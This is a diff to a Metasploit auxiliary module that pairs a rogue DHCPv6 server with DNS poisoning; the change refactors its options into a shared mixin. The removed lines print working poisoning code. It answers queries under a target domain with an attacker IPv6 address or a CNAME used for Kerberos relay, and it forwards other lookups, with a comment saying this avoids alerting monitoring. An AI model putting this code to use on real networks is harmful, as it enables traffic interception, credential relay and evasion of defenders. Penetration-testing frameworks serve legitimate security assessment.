@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DNS::Client
   include Msf::Exploit::Remote::DNS::Server
+  include Msf::Exploit::Remote::DNS::NamePoisoner
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -51,12 +52,10 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
 
+    # TARGET_DOMAIN, TARGET_HOSTS, SPOOF_IP6 and RELAY_CNAME come from the shared
+    # DNS::NamePoisoner mixin.
     register_options(
       [
-        OptString.new('TARGET_DOMAIN', [ true, 'The DNS domain to intercept; names under it are poisoned (e.g. ad.example.com).' ]),
-        OptString.new('TARGET_HOSTS', [ false, 'Specific FQDNs to poison (space or semicolon separated). If empty, all names under TARGET_DOMAIN are poisoned.' ]),
-        OptString.new('SPOOF_IP6', [ true, 'The attacker IPv6 address handed out as the DNS server and returned for poisoned names.' ]),
-        OptString.new('RELAY_CNAME', [ false, 'If set, poisoned names are answered with a CNAME to this name (the DNS-CNAME Kerberos relay trick) instead of a direct address.' ]),
         OptString.new('LEASE_IP6', [ false, 'IPv6 address to lease to clients making stateful (IA_NA) requests.' ]),
         OptString.new('DHCPV6_INTERFACE', [ false, 'Network interface to bind the DHCPv6 server and join the multicast group on.' ])
       ]
@@ -84,72 +83,7 @@ class MetasploitModule < Msf::Auxiliary
     @dhcpv6_server = nil
   end
 
-  # Poison lookups that fall under the target scope; forward everything else so
-  # the victim keeps working (and so we do not tip off monitoring by breaking
-  # unrelated name resolution).
-  def on_dispatch_request(cli, data)
-    return if data.strip.empty?
-
-    req = Packet.encode_drb(data)
-    peer = "#{cli.peerhost}:#{cli.peerport}"
-
-    poisoned = false
-    req.question.each do |question|
-      answers = poison_answers_for(question)
-      next if answers.empty?
-
-      answers.each { |rr| req.add_answer(rr) }
-      poisoned = true
-      print_good("Poisoned #{question.qname} (#{question.qtype}) for #{peer} -> #{poison_description}")
-    end
-
-    unless poisoned
-      # Not in scope: fall back to the default cache/forward behaviour.
-      return service.default_dispatch_request(cli, data)
-    end
-
-    req.header.qr = true
-    req.header.ra = true
-    service.send_response(cli, Packet.validate(req).encode)
-  end
-
   private
-
-  def poison_answers_for(question)
-    name = question.qname.to_s.chomp('.').downcase
-    return [] unless in_scope?(name)
-
-    qtype = question.qtype.to_s
-    if datastore['RELAY_CNAME'].present?
-      # Steer the victim onto a name whose SPN the attacker will relay for.
-      return [Dnsruby::RR.create(name: "#{name}.", type: 'CNAME', domainname: "#{datastore['RELAY_CNAME'].chomp('.')}.")]
-    end
-
-    case qtype
-    when 'AAAA'
-      [Dnsruby::RR.create(name: "#{name}.", type: 'AAAA', address: datastore['SPOOF_IP6'])]
-    when 'A'
-      # Only answer A records if an IPv4 spoof address is meaningful; otherwise
-      # returning nothing lets the client prefer the AAAA answer we control.
-      srvhost = datastore['SRVHOST']
-      Rex::Socket.is_ipv4?(srvhost) ? [Dnsruby::RR.create(name: "#{name}.", type: 'A', address: srvhost)] : []
-    else
-      []
-    end
-  end
-
-  def in_scope?(name)
-    if datastore['TARGET_HOSTS'].present?
-      target_hosts.include?(name)
-    else
-      domain = datastore['TARGET_DOMAIN'].downcase.chomp('.')
-      name == domain || name.end_with?(".#{domain}")
-    end
-  end
-
-  def target_hosts
-    @target_hosts ||= datastore['TARGET_HOSTS'].split(/[\s;]+/).map { |h| h.strip.chomp('.').downcase }.reject(&:empty?)
-  end
 
   def start_dhcpv6_server
     @dhcpv6_server = Rex::Proto::DHCPv6::Server.new(
@@ -165,19 +99,9 @@ class MetasploitModule < Msf::Auxiliary
     @dhcpv6_server.start
   end
 
-  def poison_description
-    datastore['RELAY_CNAME'].present? ? "CNAME #{datastore['RELAY_CNAME']}" : datastore['SPOOF_IP6']
-  end
-
   def dhcpv6_message_name(msg_type)
     Rex::Proto::DHCPv6::Constants::MessageType.constants.find do |c|
       Rex::Proto::DHCPv6::Constants::MessageType.const_get(c) == msg_type
     end || msg_type
-  end
-
-  def validate_ipv6!(address, name)
-    return if Rex::Socket.is_ipv6?(address.to_s)
-
-    fail_with(Failure::BadConfig, "#{name} must be a valid IPv6 address")
   end
 end
